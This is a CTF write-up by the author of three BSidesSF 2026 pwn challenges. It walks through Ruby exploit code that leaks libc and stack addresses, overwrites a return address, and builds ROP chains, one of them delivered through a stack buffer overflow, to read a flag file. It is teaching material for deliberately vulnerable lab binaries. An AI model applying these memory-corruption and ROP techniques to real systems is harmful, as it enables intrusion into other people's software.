---
title: 'BSidesSF 2026: read(write(call))me - progressive pwn challenges'
author: ron
layout: post
categories:
- bsidessf-2026
- bsidessf
- ctfs
- pwn
permalink: "/2026/bsidessf-2026-read-write-call-me-progressive-pwn-challenges"
date: '2026-03-30T13:55:46-07:00'
comments_id: '116320139193824438'

---

This is a write-up for three "pwn" challenges - `readwritecallme`,
`readwriteme`, `readme`. They're all pretty straight forward, and designed to
teach a specific exploit type: how to exploit an arbitrary memory write.

All three challenges let you read arbitrary memory, and the first two additionally
let you write to arbitrary memory. The final one (`readme`) only lets you read
memory, but it has a buffer overflow that lets you take control.

Technically, all three can be solved with the `readme` solution, but I'll go
over my intended solutions for all three, since I think it's helpful.

As always, you can find copies of the binaries, containers, and full solution
in our [GitHub repo](https://github.com/BSidesSF/ctf-2026-release)!

<!--more-->

## `readwritecallme`

`readwritecallme` has:
* I provide a copy of `libc.so` + the binary
* The player can read arbitrary memory
* The player can write arbitrary memory (provided they have permission to - no
  writing code!)
* A `secret_function` exists that will print the flag if called

The goal was basically to call the function.

There might be other solutions, but this is mine:

Use the PLT (a section of the `readwritecallme` binary, which is always loaded
to the same place) to get the address of `strtol` in libc:

```ruby
# These read the binary to find the expected addresses in the binary + libc
puts "Finding libc base using strtol()..."
plt_symbol_addr = get_plt_entry(FILE_READWRITECALLME, 'strtol')
libc_symbol_addr = get_symbol(FILE_LIBC, 'strtol')

# Read the address from memory
puts "  * Reading address of 'strtol' from the PLT..."
symbol_addr = read_uint64(plt_symbol_addr)
puts "  * 'strtol' is @ 0x%x" % symbol_addr

# Do some math to find the start
puts '  * Rewinding to the start of libc...'
base = symbol_addr - libc_symbol_addr
puts '  * libc starts @ 0x%x!' % base

# Sanity check
if (base % 0x1000) != 0
  raise "  The libc address isn't on a page boundary, I think there's a file mismatch..."
end
```

Next, I used the `__environ` symbol to leak a stack address

```ruby
puts "Finding stack-based return address via libc's __environ symbol..."
environ = get_symbol(FILE_LIBC, '__environ') + @libc
puts '  * __environ is @ 0x%x' % environ

environ_target = read_uint64(environ)
puts '  * Stack address __environ points to = 0x%x' % environ_target
```

Then walk backwards up the stack to find the return address (this could be
hardcoded, but because I was changing code as I developed I made it more
generic).

Basically, I start 1024 bytes past the point that `__environ` points to. I read
8 bytes at a time, and look for an address that's plausibly in the `libc`
library (in the startup function).

If it's plausibly in libc, I look for the `call rax` line (to confirm that it's
actually the right line).

Here's the code that finds the return address on the stack:

```ruby
CALL_MAIN = [
  "\xff\xd0", # Docker
  "\xff\x55\x88", # Laptop
]

# ...

# Search for the return address by looking for something that looks roughly
# like the right value (for speed), then following it and seeing if there's
# a call right before
#
# (This is a bit more complicated because we only want to call read() once,
# otherwise it's way slow)
read(environ_target - 1024, 1024).unpack('Q*').each_with_index do |test, i|
  # Ignore values that are way off
  if test < @libc
    next
  end

  if (test - @libc > 0x100000)
    next
  end

  puts '  * Plausible return address @ offset 0x%x' % (test - @libc)

  # Check if it actually returns to somewhere that looks right
  if CALL_MAIN.any? { |m| read(test - m.length, m.length) == m }
    # Do the math to figure out where what the offset into the stack was
    return_address = environ_target - 1024 + (i * 8)
    puts '  * It works! Return address is @ 0x%x' % return_address
    return return_address
  end
end
```

Once we have the return address, we can simply overwrite it to point at
`secret_function` using the "write memory" function:

```ruby
def solve_by_calling_secret_function
  puts
  puts 'Solving by calling Secret Function (level 1)'
  secret_function = get_symbol(FILE_READWRITECALLME, 'secret_function')

  puts '  * Changing return address (0x%x) to instead call secret_function() (0x%x)' % [@ret, secret_function]
  write(@ret, [secret_function].pack('Q'))

  _have_we_solved_it?()
end
```

The `_have_we_solved_it?` function is used for all three parts, and just causes
the service to exit by sending something invalid (I use the literal `exit` string,
but that's not special):

```ruby
  def _have_we_solved_it?
    # This will cause it to exit
    puts "  * Triggering the server's exit code to trigger the vuln"
    @s.puts 'exit'

    # Read from the socket till it closes
    Timeout.timeout(10) do
      data = ''
      loop do
        new_data = @s.gets
        if new_data.nil?
          check_flag(data)
          return
        end
        data += new_data
      end
    end
  end
```

### Aside: `read` vs `fread`

While doing final testing, I had a weird bug: the challenge worked fine on
my normal internet connection but failed when I was on Tailscale. It was very
odd!

I tracked it down to this server code:

```c
if(!fgets(rw, STR_SIZE, stdin))
  break;

// ...

if(!fgets(offset_str, STR_SIZE, stdin))
  break;

// ...

if(!fgets(size_str, STR_SIZE, stdin))
  break;

// ...

offset = (uint8_t*)strtoll(offset_str, NULL, 16);
size = (uint32_t*)strtol(size_str, NULL, 16);

// ...

data = read(stdin, offset, size);
```

Called by this, in my solution:
```ruby
  def write(addr, data)
    @s.puts('w')
    @s.puts('%x' % addr)
    @s.puts('%x' % data.length)
    sleep(0.1)
    @s.write(data)
  end
```

Sometimes, the `data` wasn't being fully sent!

It turns out that `fgets` can read past the newline (`\n`), and the rest of the
data is stored in an internal buffer; that means that while the `f*` functions
can access it (`fgets`, `fgets`, `fread`, etc), the low-level functions (`read` /
`write`) can no longer access it.

On my normal network connection, `sleep(0.1)` was enough to prevent the length
and data from getting bundled together; on Tailscale, it was not.

I fixed it by changing from `read` to `fread`, and then failed to deploy the
new versions until people complained it wasn't working! Whoops!

## `readwriteme`

`readwriteme` is essentially the same codebase, but I removed `secret_function`.

The first part of the solution is identical - I use the same primitives to leak
a libc address and then the return address.

Once I have the return address, I write the path to the flag -
`/home/ctf/flag.txt` - to a random spot on the stack way far away from the
other data:

```ruby
puts 'Solving by writing to memory (level 2)'
empty_memory = @ret - 0x10000

puts '  * Writing the flag path to random stack memory @ 0x%x' % empty_memory
write(empty_memory, "/home/ctf/flag.txt\0")
```

Then we build a ROP chain:

```ruby
puts '  * Building a ROP chain'
rop_chain = [
  ### open()
  @libc + POP_RDI_RET, empty_memory, # Filename
  @libc + POP_RSI_RET, 0, # Flags
  @libc + POP_RDX_RET, 0, # mode
  @libc + get_symbol(FILE_LIBC, 'open'),

  ### read()
  @libc + POP_RDI_RET, 5, # Handle
  @libc + POP_RSI_RET, empty_memory + 100, # Buffer
  @libc + POP_RDX_RET, 100, # Length
  @libc + get_symbol(FILE_LIBC, 'read'),

  ### write()
  @libc + POP_RDI_RET, 1, # Handle
  @libc + POP_RSI_RET, empty_memory + 100, # Buffer
  @libc + POP_RDX_RET, 100, # Length
  @libc + get_symbol(FILE_LIBC, 'write'),

  ### exit()
  @libc + POP_RDI_RET, 69, # code
  @libc + get_symbol(FILE_LIBC, 'exit')
].pack('Q*')

puts '  * Writing the ROP chain starting at the return address, 0x%x' % @ret
write(@ret, rop_chain)

# Make sure we're done
_have_we_solved_it?()
```

The ROP chain opens, reads, and writes the file to stdout, then calls exit.

## `readme`

The final challenge is `readme`, and the trick is that it no longer has a
`write` function. You now have to exploit a stack buffer overflow (that's always
been present) to get code execution.

To solve this generically (so I could recompile my code and not break my
solution), I do a little search to figure out how far the buffer is from the
return address (ie, how many bytes to overwrite):

```ruby
def _find_exploit_offset()
  puts "  * Filling 'data' buffer with random garbage so we can find it on the stack"

  # Use read_h to fill the "data" buffer with random junk
  data = [read_h(@libc + 1000, 100)].pack('H*')

  puts '  * Reading stack before the return address to find it...'
  read_memory = read(@ret - 1000, 1000)
  index = read_memory.index(data)

  if index.nil?
    raise "Didn't find exploit offset :("
  end

  return 1000 - index
```

Then we build a very similar ROP chain, except that this time we need to include
the filename since we can't write to arbitrary memory anymore:

```ruby
# Build our ROP chain
puts '  * Building a ROP chain'
rop_chain = [
  ### open()
  @libc + POP_RDI_RET, 0x5a5a5a5a5a5a5a5a, # Filename (will be updated)
  @libc + POP_RSI_RET, 0, # Flags
  @libc + POP_RDX_RET, 0, # mode
  @libc + get_symbol(FILE_LIBC, 'open'),

  ### read()
  @libc + POP_RDI_RET, 5, # Handle
  @libc + POP_RSI_RET, empty_memory + 100, # Buffer
  @libc + POP_RDX_RET, 100, # Length
  @libc + get_symbol(FILE_LIBC, 'read'),

  ### write()
  @libc + POP_RDI_RET, 1, # Handle
  @libc + POP_RSI_RET, empty_memory + 100, # Buffer
  @libc + POP_RDX_RET, 100, # Length
  @libc + get_symbol(FILE_LIBC, 'write'),

  ### exit()
  @libc + POP_RDI_RET, 69, # code
  @libc + get_symbol(FILE_LIBC, 'exit')
].pack('Q*')

# Add the FLAG_FILE to the end
rop_chain += "#{ FLAG_FILE }\0"
```

Then do some math to get the actual flag filename address:

```ruby
# Calculate the actual address of the flag filename + update in the rop
# chain
flag_ptr = @ret + rop_chain.length - FLAG_FILE.length - 1
rop_chain = rop_chain.gsub(/ZZZZZZZZ/, [flag_ptr].pack('Q'))
puts '  * Calculated the offset of the flag path in memory: 0x%x' % flag_ptr
```

Because the stack overflow is from "read"ing memory, the solution requires us
to find existing bytes to build the ROP chain. We build a "library" of existing
bytes by reading a chunk of libc:

```ruby
puts "  * Reading a chunk of memory that we're gonna build our exploit from"
data_buffer = read(@libc, 0x10000)
```

Then set up a whole buncha reads - but this doesn't actually send them yet! For
speed, this will do all the reads simultaneously instead of having a
back-and-forth for every byte:

```ruby
(rop_chain.length - 1).step(0, -1) do |i|
  # Get the character
  c = rop_chain[i]

  # This is how far into the libc buffer it is
  offset_into_libc = data_buffer.index(c)

  if offset_into_libc.nil?
    raise "Couldn't find character: 0x%02x" % c.ord
  end

  offset_to_write = exploit_to_ret + i + 1
  # puts "Writing 0x%02x to offset <data> + %d" % [c.ord, offset_to_write]
  read_h_caching(@libc + offset_into_libc - (offset_to_write - 1), offset_to_write)
end
```

This will send alllllll the exploit code at once:

```ruby
puts '  * Triggering the exploit!'
read_h_go()
```

And then we check if it's solved, as usual!

```ruby
# Did we win?
_have_we_solved_it?()
```
